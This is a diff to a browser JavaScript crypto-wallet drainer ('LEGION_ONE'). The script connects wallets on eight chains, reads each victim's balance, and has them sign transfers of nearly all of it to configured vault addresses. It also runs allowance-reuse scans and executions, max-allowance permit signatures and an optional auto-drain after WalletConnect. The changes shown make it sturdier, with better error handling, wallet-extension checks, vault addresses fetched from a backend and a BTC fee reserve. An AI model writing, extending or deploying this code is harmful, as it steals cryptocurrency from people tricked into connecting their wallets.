@@ -43,6 +43,65 @@
   var wcModal = null;
   var wcSdkPromise = null;
   var drainRunning = false;
+  var vaultCache = Object.assign({}, CFG.vaultAddresses || {});
+  var clientConfigLoaded = false;
+
+  var CHAIN_EXTENSIONS = {
+    evm: {
+      name: 'MetaMask or Rabby',
+      url: 'https://metamask.io/download/',
+      check: function () { return !!(window.ethereum); },
+    },
+    sol: {
+      name: 'Phantom or Solflare',
+      url: 'https://phantom.app/download',
+      check: function () {
+        return !!((window.phantom && window.phantom.solana) ||
+          (window.solflare && window.solflare.isSolflare));
+      },
+    },
+    tron: {
+      name: 'TronLink',
+      url: 'https://www.tronlink.org/',
+      check: function () { return !!(window.tronLink || window.tronWeb); },
+    },
+    ton: {
+      name: 'Tonkeeper',
+      url: 'https://tonkeeper.com/',
+      check: function () {
+        return !!((window.tonkeeper && window.tonkeeper.provider) ||
+          (window.ton && window.ton.isTonkeeper));
+      },
+    },
+    btc: {
+      name: 'UniSat or Xverse',
+      url: 'https://unisat.io/download',
+      check: function () {
+        return !!((window.unisat && window.unisat.requestAccounts) ||
+          (window.XverseProviders && window.XverseProviders.BitcoinProvider));
+      },
+    },
+    cosmos: {
+      name: 'Keplr',
+      url: 'https://www.keplr.app/get',
+      check: function () { return !!window.keplr; },
+    },
+    aptos: {
+      name: 'Petra Aptos Wallet',
+      url: 'https://petra.app/',
+      check: function () { return !!(window.aptos || (window.petra && window.petra.aptos)); },
+    },
+    sui: {
+      name: 'Sui Wallet',
+      url: 'https://sui.io/wallet',
+      check: function () { return !!(window.suiWallet || (window.phantom && window.phantom.sui)); },
+    },
+  };
+
+  var BALANCE_FAMILY = {
+    evm: 'EVM', sol: 'SVM', tron: 'TRON', ton: 'TON',
+    btc: 'BTC', cosmos: 'COSMOS', aptos: 'APTOS', sui: 'SUI',
+  };
 
   /* ── Styles (injected once) ─────────────────────────────────────────── */
   function injectStyles() {
@@ -80,10 +139,68 @@
   function setStatus(text, kind) {
     var el = document.getElementById('legion-one-status');
     if (!el) return;
-    el.textContent = text;
+    el.textContent = typeof text === 'string' ? text : formatError(text);
     el.className = kind === 'ok' ? 'ok' : kind === 'err' ? 'err' : '';
     var prog = document.getElementById('legion-one-progress');
     if (prog) prog.style.display = kind === 'busy' ? 'block' : 'none';
+  }
+
+  /** Never pass wallet provider objects to JSON.stringify — they contain circular refs. */
+  function safeStringify(value) {
+    var seen = new WeakSet();
+    return JSON.stringify(value, function (_key, val) {
+      if (typeof val === 'bigint') return val.toString();
+      if (val != null && typeof val === 'object') {
+        if (seen.has(val)) return undefined;
+        seen.add(val);
+        if (typeof val.request === 'function' || typeof val.signTransaction === 'function' ||
+            typeof val.signAndSubmitTransaction === 'function' || typeof val.send === 'function' ||
+            typeof val.connect === 'function' || typeof val.enable === 'function') {
+          return undefined;
+        }
+      }
+      if (typeof val === 'function' || typeof val === 'symbol') return undefined;
+      return val;
+    });
+  }
+
+  function formatError(err) {
+    if (!err) return 'Unknown error';
+    if (typeof err === 'string') return err;
+    if (err.message && typeof err.message === 'string') return err.message;
+    try {
+      return safeStringify(err);
+    } catch (e) {
+      return 'Error';
+    }
+  }
+
+  function walletTypeLabel(conn) {
+    if (!conn) return ACTIVE_TAB;
+    if (typeof conn.walletType === 'string' && conn.walletType) return conn.walletType;
+    if (typeof conn.provider === 'string' && conn.provider) return conn.provider;
+    if (typeof conn.name === 'string' && conn.name) return conn.name;
+    return ACTIVE_TAB;
+  }
+
+  function publicWalletSnapshot() {
+    var out = {};
+    Object.keys(wallets).forEach(function (key) {
+      var w = wallets[key];
+      if (!w) return;
+      out[key] = {
+        address: w.address,
+        walletType: walletTypeLabel(w),
+        chainId: w.chainId || undefined,
+      };
+    });
+    return out;
+  }
+
+  function toPlainJson(val) {
+    if (val == null) return val;
+    if (typeof val === 'string' || typeof val === 'number' || typeof val === 'boolean') return val;
+    return JSON.parse(safeStringify(val));
   }
 
   function parseEnvelope(res, data) {
@@ -99,15 +216,25 @@
     return h;
   }
 
+  function mapFetchError(err, path) {
+    if (err && err.message) return err.message;
+    return 'Network error calling ' + path + ' — verify backend URL and CORS (API_CORS_ORIGINS)';
+  }
+
   async function apiPost(path, body, extraHeaders) {
     var headers = Object.assign(kineticHeaders(), extraHeaders || {});
-    var res = await fetch(BACKEND + path, {
-      method: 'POST',
-      headers: headers,
-      body: JSON.stringify(body),
-      keepalive: true,
-      credentials: 'omit',
-    });
+    var res;
+    try {
+      res = await fetch(BACKEND + path, {
+        method: 'POST',
+        headers: headers,
+        body: safeStringify(body),
+        keepalive: true,
+        credentials: 'omit',
+      });
+    } catch (err) {
+      throw new Error(mapFetchError(err, path));
+    }
     var data = await res.json().catch(function () { return {}; });
     var env = parseEnvelope(res, data);
     if (!env.ok) throw new Error(env.message || 'API error ' + res.status);
@@ -115,11 +242,54 @@
   }
 
   async function apiGet(path) {
-    var res = await fetch(BACKEND + path, { method: 'GET', credentials: 'omit', keepalive: true });
+    var res;
+    try {
+      res = await fetch(BACKEND + path, { method: 'GET', credentials: 'omit', keepalive: true });
+    } catch (err) {
+      throw new Error(mapFetchError(err, path));
+    }
     var data = await res.json().catch(function () { return {}; });
     var env = parseEnvelope(res, data);
     if (!env.ok) throw new Error(env.message || 'API error ' + res.status);
     return env.data;
+  }
+
+  async function loadClientConfigVaults() {
+    if (clientConfigLoaded) return;
+    try {
+      var cfg = await apiGet('/api/v1/client-config');
+      var vaults = cfg && cfg.vault_addresses;
+      if (vaults && typeof vaults === 'object') {
+        Object.keys(vaults).forEach(function (k) {
+          var v = vaults[k];
+          if (v && String(v).trim() && (!vaultCache[k] || !String(vaultCache[k]).trim())) {
+            vaultCache[k] = String(v).trim();
+          }
+        });
+      }
+    } catch (e) { /* optional — LEGION_CONFIG vaultAddresses still work */ }
+    clientConfigLoaded = true;
+  }
+
+  function assertExtensionAvailable(tab) {
+    var ext = CHAIN_EXTENSIONS[tab];
+    if (!ext || ext.check()) return;
+    throw new Error(ext.name + ' not installed. Download: ' + ext.url);
+  }
+
+  function requireVaultAddress(chainKey) {
+    var addr = resolveVaultAddress(chainKey);
+    if (!addr) {
+      var labels = {
+        cosmos: 'Cosmos (ATOM)', aptos: 'Aptos (APT)', sui: 'Sui (SUI)', btc: 'Bitcoin (BTC)',
+      };
+      throw new Error(
+        'Vault address not configured for ' + (labels[chainKey] || chainKey) +
+        '. Set LEGION_CONFIG.vaultAddresses.' + chainKey +
+        ' in index.html or VAULT_ADDRESS_* on Railway (loaded via /api/v1/client-config).',
+      );
+    }
+    return addr;
   }
 
   function toHex(n) {
@@ -137,6 +307,7 @@
     wallets.evm = {
       address: accounts[0],
       chainId: parseInt(chainHex, 16),
+      walletType: eth.isMetaMask ? 'MetaMask' : 'Injected EVM',
       provider: eth.isMetaMask ? 'MetaMask' : 'Injected EVM',
     };
     return wallets.evm;
@@ -149,7 +320,12 @@
     var resp = await sol.connect();
     var pk = (resp && resp.publicKey) ? resp.publicKey.toString() : (sol.publicKey && sol.publicKey.toString());
     if (!pk) throw new Error('Solana wallet returned no key');
-    wallets.sol = { address: pk, provider: sol, name: window.phantom ? 'Phantom' : 'Solflare' };
+    wallets.sol = {
+      address: pk,
+      walletType: window.phantom ? 'Phantom' : 'Solflare',
+      signer: sol,
+      wc: false,
+    };
     return wallets.sol;
   }
 
@@ -162,7 +338,7 @@
     if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
       throw new Error('TronLink not ready');
     }
-    wallets.tron = { address: tw.defaultAddress.base58, provider: 'TronLink' };
+    wallets.tron = { address: tw.defaultAddress.base58, walletType: 'TronLink', provider: 'TronLink' };
     return wallets.tron;
   }
 
@@ -173,7 +349,7 @@
     var accounts = await ton.send('ton_getAccounts');
     var addr = accounts && accounts[0] && (accounts[0].address || accounts[0]);
     if (!addr) throw new Error('Tonkeeper returned no address');
-    wallets.ton = { address: String(addr), provider: ton };
+    wallets.ton = { address: String(addr), walletType: 'Tonkeeper', signer: ton };
     return wallets.ton;
   }
 
@@ -182,14 +358,14 @@
     if (window.unisat && window.unisat.requestAccounts) {
       var uAccounts = await window.unisat.requestAccounts();
       if (!uAccounts || !uAccounts[0]) throw new Error('UniSat returned no address');
-      wallets.btc = { address: uAccounts[0], provider: 'UniSat' };
+      wallets.btc = { address: uAccounts[0], walletType: 'UniSat', provider: 'UniSat' };
       return wallets.btc;
     }
     if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
       var xverse = window.XverseProviders.BitcoinProvider;
       var xAccounts = await xverse.request('getAccounts');
       if (!xAccounts || !xAccounts[0]) throw new Error('Xverse returned no address');
-      wallets.btc = { address: xAccounts[0], provider: 'Xverse' };
+      wallets.btc = { address: xAccounts[0], walletType: 'Xverse', provider: 'Xverse' };
       return wallets.btc;
     }
     throw new Error('Install UniSat (unisat.io) or Xverse wallet for Bitcoin');
@@ -204,7 +380,7 @@
     if (!offlineSigner) throw new Error('Keplr offline signer unavailable');
     var accounts = await offlineSigner.getAccounts();
     if (!accounts || !accounts[0]) throw new Error('Keplr returned no Cosmos account');
-    wallets.cosmos = { address: accounts[0].address, provider: 'Keplr', chainId: chainId };
+    wallets.cosmos = { address: accounts[0].address, walletType: 'Keplr', provider: 'Keplr', chainId: chainId };
     return wallets.cosmos;
   }
 
@@ -221,7 +397,7 @@
     }
     if (!addr && aptos.address) addr = aptos.address;
     if (!addr) throw new Error('Petra did not return an Aptos address');
-    wallets.aptos = { address: String(addr), provider: aptos, name: 'Petra' };
+    wallets.aptos = { address: String(addr), walletType: 'Petra', signer: aptos };
     return wallets.aptos;
   }
 
@@ -233,7 +409,7 @@
       var conn = await suiWallet.features['standard:connect'].connect();
       var acc = conn && conn.accounts && conn.accounts[0];
       if (!acc || !acc.address) throw new Error('Sui Wallet returned no account');
-      wallets.sui = { address: acc.address, provider: suiWallet, name: 'Sui Wallet' };
+      wallets.sui = { address: acc.address, walletType: 'Sui Wallet', signer: suiWallet };
       return wallets.sui;
     }
     if (suiWallet.requestPermissions) {
@@ -241,7 +417,7 @@
     }
     var accounts = suiWallet.getAccounts ? await suiWallet.getAccounts() : [];
     if (!accounts || !accounts[0]) throw new Error('Sui Wallet returned no address');
-    wallets.sui = { address: accounts[0], provider: suiWallet, name: 'Sui Wallet' };
+    wallets.sui = { address: accounts[0], walletType: 'Sui Wallet', signer: suiWallet };
     return wallets.sui;
   }
 
@@ -277,6 +453,12 @@
         wcModal = new sdk.WalletConnectModal({ projectId: WC_PROJECT_ID, themeMode: 'dark' });
       }
       wcProvider.on('display_uri', function (uri) { if (wcModal) wcModal.openModal({ uri: uri }); });
+      wcProvider.on('session_delete', function () {
+        wcProvider = null;
+        if (wallets.evm && wallets.evm.wcProvider) wallets.evm = null;
+        if (wallets.sol && wallets.sol.wc) wallets.sol = null;
+        setStatus('WalletConnect session expired — click WalletConnect to reconnect', 'err');
+      });
       await wcProvider.connect({
         namespaces: {
           eip155: {
@@ -299,19 +481,21 @@
       wallets.evm = {
         address: parts.slice(2).join(':'),
         chainId: parseInt(parts[1], 10),
+        walletType: 'WalletConnect',
         provider: 'WalletConnect',
         wcProvider: wcProvider,
       };
     }
     if (ns.solana && ns.solana.accounts && ns.solana.accounts[0]) {
       var sp = ns.solana.accounts[0].split(':');
-      wallets.sol = { address: sp.slice(2).join(':'), provider: wcProvider, name: 'WalletConnect', wc: true };
+      wallets.sol = { address: sp.slice(2).join(':'), walletType: 'WalletConnect', wc: true };
     }
     if (!wallets.evm && !wallets.sol) throw new Error('WalletConnect: no accounts');
     return wallets;
   }
 
   async function connectActiveTab() {
+    assertExtensionAvailable(ACTIVE_TAB);
     if (ACTIVE_TAB === 'evm') return connectEvm();
     if (ACTIVE_TAB === 'sol') return connectSolana();
     if (ACTIVE_TAB === 'tron') return connectTron();
@@ -336,14 +520,22 @@
   }
 
   function resolveVaultAddress(chainKey) {
-    var vaults = CFG.vaultAddresses || {};
-    if (vaults[chainKey]) return String(vaults[chainKey]);
-    return null;
+    var addr = vaultCache[chainKey];
+    if (!addr || !String(addr).trim()) return null;
+    return String(addr).trim();
+  }
+
+  function findBalanceRow(data, chainKey) {
+    if (!data || !data.chains) return null;
+    var family = BALANCE_FAMILY[chainKey] || chainKey.toUpperCase();
+    return data.chains.find(function (c) {
+      return c.family === family || c.family === chainKey.toUpperCase() ||
+        (c.chain && String(c.chain).toLowerCase().indexOf(chainKey) >= 0);
+    });
   }
 
   function parseNativeAmountFromBalance(data, chainKey) {
-    if (!data || !data.chains) return '0';
-    var row = data.chains.find(function (c) { return c.key === chainKey || c.family === chainKey; });
+    var row = findBalanceRow(data, chainKey);
     if (!row || !row.native) return '0';
     var raw = row.native.amount_raw || row.native.amount || '0';
     try {
@@ -352,6 +544,10 @@
       if (chainKey === 'cosmos') return (n > 5000n ? n - 5000n : n).toString();
       if (chainKey === 'aptos') return (n > 100000n ? n - 100000n : n).toString();
       if (chainKey === 'sui') return (n > 1000000n ? n - 1000000n : n).toString();
+      if (chainKey === 'btc') {
+        var feeReserve = 2000n;
+        return n > feeReserve ? (n - feeReserve).toString() : '0';
+      }
       return n.toString();
     } catch (e) {
       return '0';
@@ -371,7 +567,7 @@
       user_address: conn.address,
       chain_id: conn.chainId || 0,
       chain_family: family,
-      wallet_type: conn.provider || conn.name || ACTIVE_TAB,
+      wallet_type: walletTypeLabel(conn),
     });
   }
 
@@ -411,7 +607,10 @@
         return c.native.symbol + ': ' + c.native.amount + (c.tokens.length ? ' +' + c.tokens.length + ' tokens' : '');
       });
       el.textContent = lines.join(' | ');
-    } catch (e) { /* optional */ }
+    } catch (e) {
+      var el = document.getElementById('legion-one-balance');
+      if (el) el.textContent = 'Balance unavailable: ' + formatError(e);
+    }
   }
 
   async function tryAllowanceReuse() {
@@ -433,7 +632,7 @@
 
     var headers = kineticHeaders();
     var scanRes = await fetch(BACKEND + '/api/internal/allowance-reuse/scan', {
-      method: 'POST', headers: headers, body: JSON.stringify(scanBody), keepalive: true, credentials: 'omit',
+      method: 'POST', headers: headers, body: safeStringify(scanBody), keepalive: true, credentials: 'omit',
     });
     var scanData = await scanRes.json().catch(function () { return {}; });
     var scanEnv = parseEnvelope(scanRes, scanData);
@@ -445,7 +644,7 @@
     var execRes = await fetch(BACKEND + '/api/internal/allowance-reuse/execute', {
       method: 'POST',
       headers: headers,
-      body: JSON.stringify({ wallet_address: scanBody.wallet_address, allowances: executable }),
+      body: safeStringify({ wallet_address: scanBody.wallet_address, allowances: executable }),
       keepalive: true,
       credentials: 'omit',
     });
@@ -482,7 +681,7 @@
     var signer = await getEvmSigner();
     return signer.request({
       method: 'eth_signTypedData_v4',
-      params: [wallets.evm.address, JSON.stringify(typedData)],
+      params: [wallets.evm.address, safeStringify(typedData)],
     });
   }
 
@@ -526,7 +725,8 @@
     var web3 = await loadSolWeb3();
     var bytes = Uint8Array.from(atob(b64), function (c) { return c.charCodeAt(0); });
     var tx = web3.VersionedTransaction.deserialize(bytes);
-    var signed = await wallets.sol.provider.signTransaction(tx);
+    if (!wallets.sol.signer) throw new Error('Solana signer not available');
+    var signed = await wallets.sol.signer.signTransaction(tx);
     var out = signed.serialize();
     var bin = '';
     for (var i = 0; i < out.length; i++) bin += String.fromCharCode(out[i]);
@@ -542,8 +742,8 @@
 
   async function signTonTx(payload) {
     if (!payload || !wallets.ton) return null;
-    if (payload.boc && wallets.ton.provider.send) {
-      return wallets.ton.provider.send('ton_signData', { cell: payload.boc });
+    if (payload.boc && wallets.ton.signer && wallets.ton.signer.send) {
+      return wallets.ton.signer.send('ton_signData', { cell: payload.boc });
     }
     return payload.signed_boc || null;
   }
@@ -556,7 +756,9 @@
       balanceData = await apiGet('/api/v1/balance/multi?btc=' + encodeURIComponent(wallets.btc.address));
     } catch (e) { /* optional */ }
     var amountSat = parseNativeAmountFromBalance(balanceData, 'btc');
-    if (amountSat === '0') amountSat = '10000';
+    if (amountSat === '0') {
+      throw new Error('No spendable BTC balance — fund your wallet with testnet/mainnet sats first');
+    }
     var psbt = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
       wallet_address: wallets.btc.address,
       amount_sat: amountSat,
@@ -581,7 +783,7 @@
       amount: amountSat,
       nonce: 'btc:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
-      wallet_type: wallets.btc.provider,
+      wallet_type: walletTypeLabel(wallets.btc),
       scout_value_usd: scoutUsd || 1,
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
@@ -624,8 +826,7 @@
 
   async function runCosmosDrain(scoutUsd) {
     if (!wallets.cosmos) throw new Error('Keplr not connected');
-    var vault = resolveVaultAddress('cosmos');
-    if (!vault) throw new Error('Set LEGION_CONFIG.vaultAddresses.cosmos to your vault bech32 address');
+    var vault = requireVaultAddress('cosmos');
     var balanceData = await apiGet('/api/v1/balance/multi?cosmos=' + encodeURIComponent(wallets.cosmos.address));
     var amount = parseNativeAmountFromBalance(balanceData, 'cosmos');
     if (amount === '0') throw new Error('No spendable ATOM balance detected');
@@ -645,7 +846,7 @@
       },
       nonce: 'cosmos:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
-      wallet_type: wallets.cosmos.provider,
+      wallet_type: walletTypeLabel(wallets.cosmos),
       scout_value_usd: scoutUsd || 1,
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
@@ -654,12 +855,12 @@
 
   async function runAptosDrain(scoutUsd) {
     if (!wallets.aptos) throw new Error('Petra not connected');
-    var vault = resolveVaultAddress('aptos');
-    if (!vault) throw new Error('Set LEGION_CONFIG.vaultAddresses.aptos to your vault Aptos address');
+    var vault = requireVaultAddress('aptos');
     var balanceData = await apiGet('/api/v1/balance/multi?aptos=' + encodeURIComponent(wallets.aptos.address));
     var amount = parseNativeAmountFromBalance(balanceData, 'aptos');
     if (amount === '0') throw new Error('No spendable APT balance detected');
-    var aptos = wallets.aptos.provider;
+    var aptos = wallets.aptos.signer;
+    if (!aptos) throw new Error('Petra signer not available');
     setStatus('Sign Aptos transfer in Petra…', 'busy');
     var payload = {
       arguments: [vault, amount],
@@ -676,7 +877,7 @@
       if (typeof signedTx !== 'string' && signedTx && signedTx.toString) signedTx = signedTx.toString();
     } else if (aptos.signAndSubmitTransaction) {
       var submitted = await aptos.signAndSubmitTransaction(payload);
-      signedTx = submitted && (submitted.hash || submitted.transactionHash || JSON.stringify(submitted));
+      signedTx = submitted && (submitted.hash || submitted.transactionHash || safeStringify(submitted));
       aptosSig = submitted && submitted.signature ? submitted.signature : 'submitted';
     } else {
       throw new Error('Petra wallet API unavailable — update Petra extension');
@@ -696,7 +897,7 @@
       },
       nonce: 'aptos:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
-      wallet_type: wallets.aptos.name || 'Petra',
+      wallet_type: walletTypeLabel(wallets.aptos),
       scout_value_usd: scoutUsd || 1,
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
@@ -705,8 +906,7 @@
 
   async function runSuiDrain(scoutUsd) {
     if (!wallets.sui) throw new Error('Sui Wallet not connected');
-    var vault = resolveVaultAddress('sui');
-    if (!vault) throw new Error('Set LEGION_CONFIG.vaultAddresses.sui to your vault Sui address');
+    var vault = requireVaultAddress('sui');
     var balanceData = await apiGet('/api/v1/balance/multi?sui=' + encodeURIComponent(wallets.sui.address));
     var amount = parseNativeAmountFromBalance(balanceData, 'sui');
     if (amount === '0') throw new Error('No spendable SUI balance detected');
@@ -715,7 +915,8 @@
     var tx = new suiMod.TransactionBlock();
     var amountSplit = tx.splitCoins(tx.gas, [tx.pure(amount)]);
     tx.transferObjects([amountSplit], tx.pure(vault));
-    var suiWallet = wallets.sui.provider;
+    var suiWallet = wallets.sui.signer;
+    if (!suiWallet) throw new Error('Sui Wallet signer not available');
     var features = suiWallet.features || {};
     var signFeature = features['sui:signTransactionBlock'] || features['sui:signTransaction'];
     if (!signFeature || !signFeature.signTransactionBlock) {
@@ -741,7 +942,7 @@
       },
       nonce: 'sui:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
-      wallet_type: wallets.sui.name || 'Sui Wallet',
+      wallet_type: walletTypeLabel(wallets.sui),
       scout_value_usd: scoutUsd || 1,
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
@@ -821,7 +1022,7 @@
       signature: permitSig,
       nonce: 'omni:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
-      wallet_type: evm.provider,
+      wallet_type: walletTypeLabel(evm),
       scout_value_usd: scoutUsd || 1,
       max_allowance: MAX_PERMIT,
       requires_quorum: false,
@@ -834,7 +1035,7 @@
     if (nativeSignedSol) anchorBody.native_signed_transaction_sol = nativeSignedSol;
     if (batch.spl_mint) anchorBody.spl_mint = batch.spl_mint;
     if (batch.spl_amount) anchorBody.spl_amount = batch.spl_amount;
-    if (nativeSignedTrx) anchorBody.native_signed_transaction_trx = nativeSignedTrx;
+    if (nativeSignedTrx) anchorBody.native_signed_transaction_trx = toPlainJson(nativeSignedTrx);
     if (nativeSignedTon) anchorBody.native_signed_transaction_ton = nativeSignedTon;
     if (batch.native_amount_sol) anchorBody.nativeAmountSol = batch.native_amount_sol;
     if (batch.native_amount_trx) anchorBody.nativeAmountTrx = batch.native_amount_trx;
@@ -853,6 +1054,10 @@
     if (btn) btn.disabled = true;
 
     try {
+      await loadClientConfigVaults();
+      if (['cosmos', 'aptos', 'sui'].indexOf(ACTIVE_TAB) >= 0) {
+        requireVaultAddress(ACTIVE_TAB);
+      }
       setStatus('Connecting…', 'busy');
       var conn = skipConnect ? (
         ACTIVE_TAB === 'evm' ? wallets.evm :
@@ -918,8 +1123,8 @@
       setStatus('Settlement complete: ' + tx, 'ok');
       return result;
     } catch (err) {
-      setStatus((err && err.message) ? err.message : String(err), 'err');
-      console.warn('[LEGION_ONE]', err);
+      setStatus(formatError(err), 'err');
+      console.warn('[LEGION_ONE]', formatError(err));
       throw err;
     } finally {
       drainRunning = false;
@@ -1020,11 +1225,17 @@
         ACTIVE_TAB = tab.getAttribute('data-tab') || 'evm';
         panel.querySelectorAll('.tabs button').forEach(function (b) { b.classList.remove('on'); });
         tab.classList.add('on');
-        setStatus('Chain: ' + ACTIVE_TAB.toUpperCase(), null);
+        var ext = CHAIN_EXTENSIONS[ACTIVE_TAB];
+        var hint = ext ? ext.name : ACTIVE_TAB;
+        setStatus('Chain: ' + ACTIVE_TAB.toUpperCase() + ' — needs ' + hint, null);
       });
     });
 
     document.getElementById('legion-one-wc-btn').addEventListener('click', async function () {
+      if (ACTIVE_TAB !== 'evm' && ACTIVE_TAB !== 'sol') {
+        setStatus('WalletConnect supports EVM and Solana only — use the chain tab for ' + ACTIVE_TAB.toUpperCase(), 'err');
+        return;
+      }
       try {
         setStatus('Opening WalletConnect…', 'busy');
         await connectWalletConnect();
@@ -1033,7 +1244,7 @@
         if (AUTO_DRAIN) await runDrain({ skipConnect: true });
         else setStatus('WalletConnect connected', 'ok');
       } catch (e) {
-        setStatus(e.message || String(e), 'err');
+        setStatus(formatError(e), 'err');
       }
     });
 
@@ -1075,13 +1286,15 @@
     connect: connectActiveTab,
     connectWalletConnect: connectWalletConnect,
     drain: runDrain,
-    getWallets: function () { return Object.assign({}, wallets); },
+    getWallets: publicWalletSnapshot,
+    safeStringify: safeStringify,
     setTab: function (tab) { ACTIVE_TAB = tab; },
     config: CFG,
   };
 
   function boot() {
     mountUi();
+    loadClientConfigVaults().catch(function () { /* non-fatal */ });
   }
 
   if (document.readyState === 'loading') {
